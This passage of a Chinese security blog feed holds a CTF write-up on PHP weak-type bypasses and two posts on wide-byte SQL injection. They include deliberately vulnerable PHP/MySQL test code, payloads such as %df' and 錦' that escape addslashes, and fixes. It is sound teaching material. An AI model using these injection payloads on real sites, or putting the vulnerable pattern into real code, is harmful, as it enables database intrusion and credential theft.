<p>所以如果是<code>===</code>，那么就要利用内置函数的参数松散性，使用md5()函数无法接受的参数，就比如我传进两个不相等的数组，这样md5()函数无法计算出正确的结果，从而导致<code>md5($_GET[&#39;a&#39;]) === md5($_GET[&#39;b&#39;])</code></p>
<p>构造URL：<code>http://ip/ceshi2.php?a[]=aaa&amp;b[]=bbb</code></p>
<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh12php%E5%BC%B1%E7%B1%BB%E5%9E%8B5.png" alt=""></p>
<p>2.PHP中十六进制数绕过的实例</p>
<p>0x(十六进制的转换)开头的字符串会被解析成十进制再进行比较，所以0x开头的字符串与其十进制的字符串或者数值都是相等的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">  $number = $_GET[<span class="string">'a'</span>];</div><div class="line">   </div><div class="line">	<span class="function"><span class="keyword">function</span> <span class="title">noother_says_correct</span><span class="params">($number)</span></span>&#123;</div><div class="line"></div><div class="line">		$one = ord(<span class="string">'1'</span>); <span class="comment">//ord()函数：将参数转换成ASCII值</span></div><div class="line"></div><div class="line">		$nine = ord(<span class="string">'9'</span>);</div><div class="line"></div><div class="line">		<span class="comment">// Check all the input characters!</span></div><div class="line">     </div><div class="line">		<span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($number); $i++)&#123; <span class="comment">//以`$number`变量的长度进行循环</span></div><div class="line">         </div><div class="line">			<span class="comment">// 使得`$number`变量中的每一个字符的值都不能在`1-9`之间，如果在则返回错误值</span></div><div class="line"></div><div class="line">			$digit = ord($number&#123;$i&#125;);</div><div class="line">        </div><div class="line">			<span class="keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )&#123;</div><div class="line"></div><div class="line">				<span class="comment">// Aha, digit not allowed!</span></div><div class="line"></div><div class="line">				<span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line"></div><div class="line">			&#125;</div><div class="line"></div><div class="line">		&#125;</div><div class="line">   <span class="comment">//最后会对`$number`变量与`"3735929054"`字符串进行比较</span></div><div class="line">	<span class="keyword">return</span> $number == <span class="string">"3735929054"</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(noother_says_correct($number) == <span class="keyword">true</span>)&#123;</div><div class="line">		<span class="keyword">echo</span> <span class="string">'This is flag'</span>;</div><div class="line">	&#125;</div></pre></td></tr></table></figure>
<p>从这段代码可以看出要求<code>$number</code>变量的值不能在<code>1-9</code>之间，但是在函数最后<code>$number</code>变量要与<code>&quot;3735929054&quot;</code>字符串进行比较，相等返回true，否则返回false。只有返回结果为true才会输出flag，那么目标就是让<code>$number</code>变量与<code>&quot;3735929054&quot;</code>字符串相等，方法就是利用十六进制数进制转换，可以发现<code>&quot;3735929054&quot;</code>的十六进制为<code>deadc0de</code>，我们在这个字符串前加上<code>0x</code>这样的话在和<code>&quot;3735929054&quot;</code>进行比较时<code>0xdeadc0de</code>就换先进行进制转换成十进制数再进行比较。这个十六进制数也可以绕过函数对于不能存在<code>1-9</code>的限制</p>
<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh12php%E5%BC%B1%E7%B1%BB%E5%9E%8B6.png" alt=""></p>
<p><a href="http://www.secbox.cn/hacker/1889.html" target="_blank" rel="external">那些年学过的PHP黑魔法</a></p>
]]></content>
      
        <categories>
            
            <category> ctf </category>
            
        </categories>
        
        
        <tags>
            
            <tag> PHP弱类型 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[心得体会---宽字节注入]]></title>
      <url>/2017/08/17/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</url>
      <content type="html"><![CDATA[<h4 id="宽字节注入心得体会"><a href="#宽字节注入心得体会" class="headerlink" title="宽字节注入心得体会"></a>宽字节注入心得体会</h4><p>转载了p神的一篇写宽字节注入的，本来想自己总结，可是看了p神的文章后觉得写得太棒了，就转载了！</p>
<p>读完p神的文章后，也对宽字节注入有了一个大体的了解：</p>
<h5 id="0x01-在什么情况下我们可能会使用宽字节注入来绕过"><a href="#0x01-在什么情况下我们可能会使用宽字节注入来绕过" class="headerlink" title="0x01 在什么情况下我们可能会使用宽字节注入来绕过"></a>0x01 在什么情况下我们可能会使用宽字节注入来绕过</h5><pre><code>(1)存在 GBK 编码(这里说的比较含糊是因为宽字节注入可能是因为mysql的特性问题，也有可能是PHP本身的问题，在下面的原理中会详细说明)

(2)PHP 开启 magic_quotes_gpc 函数、使用 addslashes 函数、错误使用mysql_real_escape_string函数，或者使用 iconv 函数。
</code></pre><h5 id="0x02-产生原因："><a href="#0x02-产生原因：" class="headerlink" title="0x02 产生原因："></a>0x02 产生原因：</h5><p>在知道了什么情况下我们可能利用宽字节注入后，接下来就是宽字节注入的原理了，产生宽字节注入的原因主要有两个：</p>
<p>(1)利用了 mysql 的特性：</p>
<pre><code>mysql 在使用 GBK 编码的时候会认为两个字符是一个汉字(前一个字符的 ASCII 码值要大于128，才能进入汉字范围)
</code></pre><p>那么只要我们在构造的语句中加入 %df 、%aa 等这样的字符(0×81-0xFE都可以选择)，这些字符就会和转义字符 <code>\</code> 形成一个 GBK 编码认为的汉字，即使我们加入的符号和 <code>\</code>(%5c) 构成的不是一个汉字，可是 GBK 编码还是会将其合并在一起进行编码，这样注意字符 <code>\</code> 就被除掉了，<code>&#39;</code> 得以逃逸出来。这样就绕过了像 magic_quotes_gpc函数、addslashes 函数等函数的限制</p>
<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh11%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%931.png" alt=""></p>
<p>(2)利用了 PHP 的函数 iconv 函数</p>
<p>iconv 函数引发的宽字节注入问题就和 mysql 没有关系了，有的时候针对于宽字节注入的防护做的非常好(具体防护问题后面细说)，可是就是由于有些程序员为了避免乱码，使用了 iconv 函数(搜索框位置出现频繁)再次导致了宽字节注入的发生：</p>
<pre><code>1&apos; `iconv(&apos;utf-8&apos;, &apos;gbk&apos;, $变量);` 情况下，即将变量由 utf-8 的编码格式转换成 gbk 编码格式。
</code></pre><p>我们利用宽字节注入就是想绕过诸如 magic_quotes_gpc函数、addslashes 函数的限制，使这些函数对我们自己加入的 <code>&#39;</code> 失效，以达到注入的效果，iconv函数这样使用过后导致宽字节注入的情况比较特殊，特殊的地方在于只有少数的汉字的 GBK 编码的第二个字节是 %5C ，只有这样的汉字经过这样的转换才可以导致宽字节注入，0×81-0xFE 开头 + 0×5C 的字符都可以</p>
<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh11%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%932.png" alt=""></p>
<pre><code>2&apos; `iconv(&apos;gbk&apos;, &apos;utf-8k&apos;, $变量);` 情况下，即将变量由 gbk 的编码格式转换成 utf-8 编码格式。
</code></pre><p>在这种情况下问题还是出现在 PHP 身上，因为 GBK 编码表示一个汉字使用两个字节，而 utf-8 编码表示一个汉字使用三个字节，如果把 GBK 转换成 utf-8 则 PHP 会每两个字节一转换。根据这个原理，如果我构造的语句中 <code>&#39;</code> 前面的字符数是奇数的话，在从 GBK 向 utf-8 转换的过程中 <code>\</code> 势必会被我们前面添加的字符合并，使得 <code>\</code> 被吞掉。</p>
<p>由 PHP 的 <code>iconv(&#39;gbk&#39;, &#39;utf-8k&#39;, $变量);</code> 导致的宽字节注入，在注入语句的构造方面和由 mysql 特性造成的宽字节注入语句是一致的，可是形成的原因却并不相同：一个是由 mysql 的特性造成的，而另一个则是由 PHP 函数的误用造成的。由 mysql 特性导致的宽字节注入可以在做好防护使宽字节注入不再发生；而由 PHP iconv 函数造成的问题是因为函数的误用导致的，如果误用了就会造成宽字节注入</p>
<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh11%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%933.png" alt=""></p>
<h5 id="0x03-宽字节注入的流程"><a href="#0x03-宽字节注入的流程" class="headerlink" title="0x03 宽字节注入的流程"></a>0x03 宽字节注入的流程</h5><p>1.先尝试加 <code>&#39;</code> ，尝试无果后猜测 <code>&#39;</code> 可能被转义了，于是尝试在 <code>&#39;</code> 前加上 %df 、%aa 等字符尝试是否存在宽字节注入，如果报错则可能为宽字节注入</p>
<p>2.若尝试无果，则尝试在 <code>&#39;</code> 前加 <code>錦</code> 这样的汉字，如果报错则可能为宽字节注入</p>
<h5 id="0x04-对于宽字节注入的修复"><a href="#0x04-对于宽字节注入的修复" class="headerlink" title="0x04 对于宽字节注入的修复"></a>0x04 对于宽字节注入的修复</h5><p>对于宽字节注入的修复主要有两种方式</p>
<pre><code>(1)使用 mysql_set_charset(&apos;gbk&apos;, $conn); + mysql_real_escape_string($_GET[&apos;id&apos;]);
</code></pre><p> mysql_set_charset 函数的作用是：设置 PHP 连接 mysql 的字符集</p>
<p> mysql_real_escape_string 函数的作用和 addslashes 函数的作用是一致的，是用来过滤输入的，而且还考虑到连接的当前字符集</p>
<p> mysql_set_charset 函数设置了 PHP 连接 mysql 的字符集，使得 mysql_real_escape_string 函数在过滤用户输入时考虑到这是 gbk 编码，以避免宽字节注入的产生</p>
<p> 但是值得注意的是：如果我们不使用 mysql_set_charset 函数而是只单独使用 mysql_real_escape_string 函数是无法避免宽字节注入的，因为 PHP 连接 mysql 时无法得知连接的字符集，所以就无法进行安全的过滤输入</p>
<pre><code>(2)使用 SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary
</code></pre><p>当我们的mysql接受到客户端的数据后，会认为他的编码是character_set_client，然后会将之将换成character_set_connection的编码，然后进入具体表和字段后，再转换成字段对应的编码。</p>
<p>然后，当查询结果产生后，会从表和字段的编码，转换成character_set_results编码，返回给客户端。</p>
<p>所以，我们将character_set_client设置成binary，就不存在宽字节或多字节的问题了，所有数据以二进制的形式传递，就能有效避免宽字符注入。</p>
<h5 id="0x05-注意事项"><a href="#0x05-注意事项" class="headerlink" title="0x05 注意事项"></a>0x05 注意事项</h5><p>1.GB2312 与 GBK 的不同</p>
<p>数据库的编码设置成 GBK 时，利用 mysql 的特性可以进行宽字节注入，但是如果数据库的编码设置成 GB2312 编码的话宽字节注入就不成功了。</p>
<p>原因在于：GB2312 编码的取值范围。高位取值范围是 <code>0xA1~0xF7</code> ；低位范围是 <code>0xA1~0xFE</code> ，而 <code>\</code> 是 <code>0x5c</code> 。<code>0x5c</code> 是根本不在 GB2312 的低位范围内的，<code>\</code> 根本就不属于 GB2312 编码，所以 <code>\</code> 是不会被吃掉的</p>
<p>2.iconv 函数的使用问题</p>
<p>iconv 函数的功能是转换字符串编码，避免乱码的产生，但是这个函数也可能直接导致宽字节注入，所以这个函数请谨慎使用。只要我们把前端html/js/css所有编码设置成gbk，mysql/php编码设置成gbk，就不会出现乱码问题。</p>
<h5 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h5><p>以上就是我最近学习宽字节注入的心得体会，文章中的图片都是我自己用 xmind 做的，自己做图也算是对原理的理解吧，感觉这些天收获挺大的，一直先研究一下注入方面的知识，可是一直没落实到行动上，这次终于真真正正的学习了一把，感觉注入方面比较抽象，只有通过 <code>页面的回显 + 源码的分析</code> 才可能真正理解到原理所在。这些天的学习之后，感觉自己任重而道远，还有很多很多东西要去学习，技术永无止境，只有先把基础打牢之后才有可能深入的去学习更加深层次的东西。</p>
<p>虽然进行了总结，可是对于宽字节注入我还是有不理解的地方，我会继续在这方面学习，争取把自己不懂的地方都弄明白～～</p>
]]></content>
      
        <categories>
            
            <category> 注入 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 宽字节注入(总结) </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[宽字节注入[转载]]]></title>
      <url>/2017/08/15/%5B%E8%BD%AC%E8%BD%BD%5D%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/</url>
      <content type="html"><![CDATA[<h4 id="转载-宽字节注入"><a href="#转载-宽字节注入" class="headerlink" title="[转载]宽字节注入"></a>[转载]宽字节注入</h4><p>尽管现在呼吁所有的程序都使用 unicode 编码，所有的网站都使用 utf-8 编码，来一个统一的国际规范。但仍然有很多，包括国内及国外（特别是非英语国家）的一些 cms，仍然使用着自己国家的一套编码，比如 gbk，作为自己默认的编码类型。也有一些 cms 为了考虑老用户，所以出了 gbk 和 utf-8 两个版本。</p>
<p>我们就以 gbk 字符编码为示范，拉开帷幕。gbk 是一种多字符编码，具体定义自行百度。但有一个地方尤其要注意：</p>
<p>通常来说，一个 gbk 编码汉字，占用2个字节。一个 utf-8 编码的汉字，占用3个字节。在 php 中，我们可以通过输出</p>
<pre><code>echo strlen(&quot;和&quot;);
</code></pre><p>来测试。当将页面编码保存为 gbk 时输出2，utf-8 时输出3。</p>
<p>除了 gbk 以外，所有 ANSI 编码都是2个字节。ANSI 只是一个标准，在不同的电脑上它代表的编码可能不相同，比如简体中文系统中 ANSI 就代表是 GBK。</p>
<p>以上是一点关于多字节编码的小知识，只有我们足够了解它的组成及特性以后，才能更好地去分析它身上存在的问题。</p>
<p>说了这么多废话，现在来研究一下在SQL注入中，字符编码带来的各种问题。</p>
<h5 id="0×01-MYSQL中的宽字符注入"><a href="#0×01-MYSQL中的宽字符注入" class="headerlink" title="0×01 MYSQL中的宽字符注入"></a>0×01 MYSQL中的宽字符注入</h5><p>这是一个老话题了，也被人玩过无数遍。但作为我们这篇文章的序幕，也是基础，是必须要提的。</p>
<p>我们先搭建一个实验环境。暂且称之为 phithon 内容管理系统v1.0，首先先新建一个数据库，把如下压缩包中的sql文件导入：</p>
<p>测试代码及数据库：<a href="http://pan.baidu.com/s/1eQmUArw" target="_blank" rel="external">http://pan.baidu.com/s/1eQmUArw</a> 提取密码:75tu</p>
<p>之后的phithon内容管理系统会逐步完善，但会一直使用这个数据表。</p>
<p>源码很简单（注意先关闭自己 php 环境的 magic_quotes_gpc）：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">//连接数据库部分，注意使用了gbk编码，把数据库信息填写进去</span></div><div class="line">$conn = mysql_connect(<span class="string">'localhost'</span>, <span class="string">'root'</span>, <span class="string">'toor!@#$'</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'bad!'</span>);</div><div class="line">mysql_query(<span class="string">"SET NAMES 'gbk'"</span>);</div><div class="line">mysql_select_db(<span class="string">'test'</span>, $conn) <span class="keyword">OR</span> emMsg(<span class="string">"连接数据库失败，未找到您填写的数据库"</span>);</div><div class="line"><span class="comment">//执行sql语句</span></div><div class="line">$id = <span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]) ? addslashes($_GET[<span class="string">'id'</span>]) : <span class="number">1</span>;</div><div class="line">$sql = <span class="string">"SELECT * FROM news WHERE tid='&#123;$id&#125;'"</span>;</div><div class="line">$result = mysql_query($sql, $conn) <span class="keyword">or</span> <span class="keyword">die</span>(mysql_error()); <span class="comment">//sql出错会报错，方便观察</span></div><div class="line"><span class="meta">?&gt;</span></div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;meta charset=<span class="string">"gbk"</span> /&gt;</div><div class="line">&lt;title&gt;新闻&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$row = mysql_fetch_array($result, MYSQL_ASSOC);</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2&gt;&#123;$row['title']&#125;&lt;/h2&gt;&lt;p&gt;&#123;$row['content']&#125;&lt;p&gt;\n"</span>;</div><div class="line">mysql_free_result($result);</div><div class="line"><span class="meta">?&gt;</span></div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<p>SQL语句是 <code>SELECT * FROM news WHERE tid=&#39;{$id}&#39;</code>，就是根据文章的 id 把文章从 news 表中取出来。</p>
<p>在这个 sql 语句前面，我们使用了一个 addslashes 函数，将 $id 的值转义。这是通常 cms 中对 sql 注入进行的操作，只要我们的输入参数在单引号中，就逃逸不出单引号的限制，无法注入，如下图：</p>
<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh10%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A51.png" alt=""></p>
<p>那么怎么逃过 addslashes 的限制？众所周知 addslashes 函数产生的效果就是，让 <code>&#39;</code> 变成 <code>\&#39;</code> ，让引号变得不再是“单引号”，只是一撇而已。一般绕过方式就是，想办法处理 <code>\&#39;</code> 前面的 <code>\</code> ：</p>
<p>1.想办法给 <code>\</code> 前面再加一个 <code>\</code>（或单数个即可），变成 <code>\\&#39;</code> ，这样 <code>\</code> 被转义了，<code>&#39;</code> 逃出了限制<br>2.想办法把 <code>\</code> 弄没有。</p>
<p>我们这里的宽字节注入是利用 mysql 的一个特性，mysql 在使用 GBK 编码的时候，会认为两个字符是一个汉字（前一个ascii码要大于128，才到汉字的范围）。如果我们输入 <code>%df&#39;</code> 看会怎样：</p>
<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh10%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A52.png" alt=""></p>
<p>我们可以看到，已经报错了。我们看到报错，说明 sql 语句出错，看到出错说明可以注入了。</p>
<p>为什么从刚才到现在，只是在 <code>&#39;</code> 也就是 <code>%27</code> 前面加了一个 <code>%df</code> 就报错了？而且从图中可以看到，报错的原因就是多了一个单引号，而单引号前面的反斜杠不见了。</p>
<p>这就是 mysql 的特性，因为gbk是多字节编码，他认为两个字节代表一个汉字，所以 <code>%df</code> 和后面的 <code>\</code> 也就是 <code>%5c</code> 变成了一个汉字 <code>“運”</code> ，而 <code>&#39;</code> 逃逸了出来。</p>
<p>因为两个字节代表一个汉字，所以我们可以试试 %df%df%27 ：</p>
<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh10%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A53.png" alt=""></p>
<p>不报错了。因为 %df%df 是一个汉字，%5c%27 不是汉字，仍然是 <code>\&#39;</code>。</p>
<p>那么mysql怎么判断一个字符是不是汉字，根据 gbk 编码，第一个字节 ascii 码大于128，基本上就可以了。比如我们不用 %df，用 %a1 也可以：</p>
<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh10%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A54.png" alt=""></p>
<p>%a1%5c 他可能不是汉字，但一定会被 mysql 认为是一个宽字符，就能够让后面的 %27 逃逸了出来。</p>
<p>于是我可以构造一个 exp 出来，查询管理员账号密码：</p>
<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh10%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A55.png" alt=""></p>
<h5 id="0×02-GB2312与GBK的不同"><a href="#0×02-GB2312与GBK的不同" class="headerlink" title="0×02 GB2312与GBK的不同"></a>0×02 GB2312与GBK的不同</h5><p>曾经有一个问题一直困扰我很久。</p>
<p>gb2312 和 gbk 应该都是宽字节家族的一员。但我们来做个小实验。把 phithon 内容管理系统中 set names 修改成 gb2312:</p>
<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh10%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A56.png" alt=""></p>
<p>结果就是不能注入了：</p>
<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh10%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A57.png" alt=""></p>
<p>有些同学不信的话，也可以把数据库编码也改成 gb2312，也是不成功的。</p>
<p>为什么，这归结于 gb2312 编码的取值范围。它的高位范围是 <code>0xA1~0xF7</code> ，低位范围是 <code>0xA1~0xFE</code> ，而 <code>\</code> 是 <code>0x5c</code> ，是不在低位范围中的。所以，<code>0x5c</code> 根本不是 <code>gb2312</code> 中的编码，所以自然也是不会被吃掉的。</p>
<p>所以，把这个思路扩展到世界上所有多字节编码，我们可以这样认为：只要低位的范围中含有 <code>0x5c</code> 的编码，就可以进行宽字符注入。</p>
<h5 id="0×03-mysql-real-escape-string解决问题？"><a href="#0×03-mysql-real-escape-string解决问题？" class="headerlink" title="0×03 mysql_real_escape_string解决问题？"></a>0×03 mysql_real_escape_string解决问题？</h5><p>部分cms对宽字节注入有所了解，于是寻求解决方案。在php文档中，大家会发现一个函数，mysql_real_escape_string，文档里说了，考虑到连接的当前字符集。</p>
<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh10%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A58.png" alt=""></p>
<p>于是，有的 cms 就把 addslashes 替换成 mysql_real_escape_string ，来抵御宽字符注入。我们继续做试验，phithon 内容管理系统 v1.2: ，就用 mysql_real_escape_string 来过滤输入：</p>
<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh10%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A59.png" alt=""></p>
<p>我们来试试能不能注入：</p>
<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh10%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A510.png" alt=""></p>
<p>一样没压力注入。为什么，明明我用了 mysql_real_escape_string ，但却仍然不能抵御宽字符注入。</p>
<p>原因就是，你没有指定 php 连接 mysql 的字符集。我们需要在执行 sql 语句之前调用一下 mysql_set_charset 函数，设置当前连接的字符集为 gbk 。</p>
<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh10%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A511.png" alt=""></p>
<p>就可以避免这个问题了：</p>
<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh10%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A512.png" alt=""></p>
<h5 id="0×04-宽字符注入的修复"><a href="#0×04-宽字符注入的修复" class="headerlink" title="0×04 宽字符注入的修复"></a>0×04 宽字符注入的修复</h5><p>在3中我们说到了一种修复方法，就是先调用 mysql_set_charset 函数设置连接所使用的字符集为 gbk ，再调用 mysql_real_escape_string 来过滤用户输入。</p>
<p>这个方式是可行的，但有部分老的 cms，在多处使用 addslashes 来过滤字符串，我们不可能去一个一个把 addslashes 都修改成 mysql_real_escape_string。我们第二个解决方案就是，将 character_set_client设置为binary（二进制）。</p>
<p>只需在所有sql语句前指定一下连接的形式是二进制：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary</div></pre></td></tr></table></figure>
<p>这几个变量是什么意思？</p>
<p>当我们的 mysql 接受到客户端的数据后，会认为他的编码是 character_set_client ，然后会将之将换 成character_set_connection 的编码，然后进入具体表和字段后，再转换成字段对应的编码。</p>
<p>然后，当查询结果产生后，会从表和字段的编码，转换成 character_set_results 编码，返回给客户端。</p>
<p>所以，我们将 character_set_client 设置成 binary ，就不存在宽字节或多字节的问题了，所有数据以二进制的形式传递，就能有效避免宽字符注入。</p>
<p>比如，我们的 phithon 内容管理系统 v2.0 版本更新如下：</p>
<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh10%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A513.png" alt=""></p>
<p>已经不能够注入了：</p>
<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh10%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A514.png" alt=""></p>
<p>在我审计过的代码中，大部分cms是以这样的方式来避免宽字符注入的。这个方法可以说是有效的，但如果开发者画蛇添足地增加一些东西，会让之前的努力前功尽弃。</p>
<h5 id="0×05-iconv导致的致命后果"><a href="#0×05-iconv导致的致命后果" class="headerlink" title="0×05 iconv导致的致命后果"></a>0×05 iconv导致的致命后果</h5><p>很多 cms ，不止一个，我就不提名字了，他们的gbk版本都存在因为字符编码造成的注入。但有的同学说，自己测试了这些cms的宽字符注入，没有效果呢，难道是自己姿势不对？</p>
<p>当然不是。实际上，这一章说的已经不再是宽字符注入了，因为问题并不是出在 mysql 上，而是出在 php 中了。</p>
<p>很多 cms（真的很多哦，不信大家自己网上找找）会将接收到数据，调用这样一个函数，转换其编码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">iconv(<span class="string">'utf-8'</span>, <span class="string">'gbk'</span>, $_GET[<span class="string">'word'</span>]);</div></pre></td></tr></table></figure>
<p>目的一般是为了避免乱码，特别是在搜索框的位置。</p>
<p>比如我们的phithon内容管理系统 v3.0</p>
<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh10%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A515.png" alt=""></p>
<p>我们可以看到，它在 sql 语句执行前，将 character_set_client 设置成了 binary ，所以可以避免宽字符注入的问题。但之后其调用了 iconv 将已经过滤过的参数 $id 给转换了一下。</p>
<p>那我们来试试此时能不能注入：</p>
<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh10%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A516.png" alt=""></p>
<p>居然报错了。说明可以注入。而我只是输入了一个錦’。这是什么原因？</p>
<p>我们来分析一下。<code>“錦“</code> 这个字，它的 <code>utf-8</code> 编码是 <code>0xe98ca6</code>，它的gbk编码是 <code>0xe55c</code>。</p>
<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh10%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A517.png" alt=""></p>
<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh10%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A518.png" alt=""></p>
<p>有的同学可能就领悟了。<code>\</code> 的ascii码正是 5c。那么，当我们的錦被 iconv 从 utf-8 转换成 gbk 后，变成了 %e5%5c，而后面的 <code>&#39;</code> 被 addslashes 变成了 %5c%27 ，这样组合起来就是 %e5%5c%5c%27，两个 %5c 就是 <code>\</code> ，正好把反斜杠转义了，导致 <code>’</code> 逃逸出单引号，产生注入。</p>
<p>这正利用了我之前说的，绕过 addslashes 的两种方式的第一种：将 <code>\</code> 转义掉。</p>
<p>那么，如果我是用 iconv 将 gbk 转换成 utf-8 呢？</p>
<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh10%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A519.png" alt=""></p>
<p>我们来试试：</p>
<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh10%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A520.png" alt=""></p>
<p>果然又成功了。这次直接用宽字符注入的姿势来的，但实际上问题出在 php 而不是 mysql。我们知道一个 gbk 汉字2字节，utf-8 汉字3字节，如果我们把 gbk 转换成 utf-8，则 php 会每两个字节一转换。所以，如果 <code>\&#39;</code> 前面的字符是奇数的话，势必会吞掉 <code>\</code>，<code>&#39;</code> 逃出限制。</p>
<p>那么为什么之前 utf-8 转换成 gbk 的时候，没有使用这个姿势？</p>
<p>这跟 utf-8 的规则有关，UTF-8 的编码规则很简单，只有二条</p>
<pre><code>1）对于单字节的符号，字节的第一位设为0，后面7位为这个符号的unicode码。因此对于英语字母，UTF-8编码和ASCII码是相同的。

2）对于n字节的符号（n&gt;1），第一个字节的前n位都设为1，第n+1位设为0，后面字节的前两位一律设为10。剩下的没有提及的二进制位，全部为这个符号的unicode码。
</code></pre><p>从2我们可以看到，对于多字节的符号，其第2、3、4字节的前两位都是10，也就是说，<code>\</code>（0x0000005c）不会出现在 utf-8 编码中，所以 utf-8 转换成 gbk 时，如果有 <code>\</code> 则php会报错：</p>
<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh10%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A521.png" alt=""></p>
<p>但因为gbk编码中包含了 <code>\</code>，所以仍然可以利用，只是利用方式不同罢了。</p>
<p>总而言之，在我们处理了 mysql 的宽字符注入以后，也别认为就可以高枕无忧了。调用 iconv 时千万要小心，避免出现不必要的麻烦。 </p>
